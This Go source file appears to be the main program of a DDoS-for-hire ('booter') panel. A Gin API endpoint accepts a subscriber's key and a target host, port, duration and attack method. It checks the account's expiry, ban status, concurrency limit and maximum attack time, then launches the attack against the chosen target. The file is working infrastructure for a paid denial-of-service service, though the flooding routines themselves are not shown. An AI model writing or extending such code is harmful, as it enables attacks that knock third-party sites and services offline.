package main

import (
	"fmt"
	"log"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
	"webserver/src/attacks"
	"webserver/src/config"
	"webserver/src/database"
	"webserver/src/server"
	"webserver/src/server/commands"
	"webserver/src/utils"

	"github.com/gin-gonic/contrib/static"
	"github.com/gin-gonic/gin"
)

func Server(host string, port int) {
	if err := http.ListenAndServe(fmt.Sprintf("%s:%d", host, port), nil); err != nil {
		log.Fatal(err)
	}
}

func main() {

		if err := config.LoadConfig("config.json"); err != nil {
		log.Fatal(err)
	}

	if err := database.ConnectDatabase(); err != nil {
		log.Fatal(err)
	}

	go server.Start()
	go commands.Init()
	log.Printf("(server) Starting Webserver!")

	router := gin.Default()
	router.Use(static.Serve("/", static.LocalFile("./static", true)))
	apigroup := router.Group("/api")
	{
		apigroup.GET("attack", apiattack)
		apigroup.GET("reload", reload)
	}

	router.Run(fmt.Sprintf("%s:%d", config.Cfg.Server.Host, config.Cfg.Server.Port))
}

func reload(c *gin.Context) {
	if err := config.LoadConfig("config.json"); err != nil {
		log.Print(err)
		c.JSON(400, gin.H{
			"error": "You Have An Error In Your Configuration File!",
		})
	}
}

func apiattack(c *gin.Context) {
	username := c.DefaultQuery("username", "")
	key := c.DefaultQuery("key", "")
	host := c.DefaultQuery("host", "")
	port := c.DefaultQuery("port", "")
	atttme := c.DefaultQuery("time", "")
	method := c.DefaultQuery("method", "")

	switch 0 {
	case len(username):
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "Invalid Username",
		})
		return
	case len(key):
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "Invalid Key",
		})
		return
	case len(host):
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "Invalid Host",
		})
		return
	case len(port):
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "Invalid Port",
		})
		return
	case len(atttme):
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "Invalid Attack Time",
		})
		return
	case len(method):
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "Invalid Method",
		})
		return
	}
	data, ok := database.CheckKeyUser(username, key)
	if ok != true {
		c.JSON(http.StatusUnauthorized, gin.H{
			"error": "Invalid Username/key",
		})
		return
	} else {
		if database.CheckBan(data.Username) {
			c.JSON(http.StatusBadRequest, gin.H{
				"error": "Your Account Has Been Suspended / Banned If You Feel This is Wrong Please Contact the Owner",
			})
			return
		}

		if data.Expire < int(time.Now().Unix()) {
			c.JSON(http.StatusBadRequest, gin.H{
				"error": "Your Account Has Expired!",
			})
			return
		}
		//
		if strings.HasPrefix(host, "http") {
			// dont parse host
		} else if net.ParseIP(host) == nil {
			c.JSON(http.StatusBadRequest, gin.H{
				"error": "Invalid Host",
			})
			return
		}

		// check concurrents
		running := database.GetConcurrents(data.Username)
		if running >= data.Conns {
			c.JSON(http.StatusBadRequest, gin.H{
				"error": "Max Concurrent Limit Reached",
			})
			return
		}

		tm, err := strconv.Atoi(atttme)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{
				"error": "Time Is Not A Interger",
			})
			return
		}

		if tm > data.MaxTime {
			c.JSON(http.StatusBadRequest, gin.H{
				"error": fmt.Sprintf("Your Max Time Is %d", data.MaxTime),
			})
			return
		}
		methods, err := database.GetMethods()
		if err != nil {
			return
		}
		for _, m := range methods {
			methodsplit := strings.Split(m.Methods, ",")
			if utils.InArray(method, methodsplit) {
				// log attack
				if err := database.LogAttack(username, host, port, atttme, method); err != nil {
					c.JSON(http.StatusBadRequest, gin.H{
						"error": "Something went Wrong sending attack",
					})
					log.Printf("(log/err) %s", err)
					return
				} else {
					go attacks.Launch(data.Username, host, port, atttme, method)
					c.JSON(http.StatusOK, gin.H{
						"success": fmt.Sprint("true"),
						"host":    host,
						"port":    url.QueryEscape(port),
						"time":    url.QueryEscape(atttme),
						"method":  url.QueryEscape(method),
					})
				}
			} else {
				c.JSON(http.StatusBadRequest, gin.H{
					"error": "Method Does Not Exist",
				})
			}
		}
	}
}
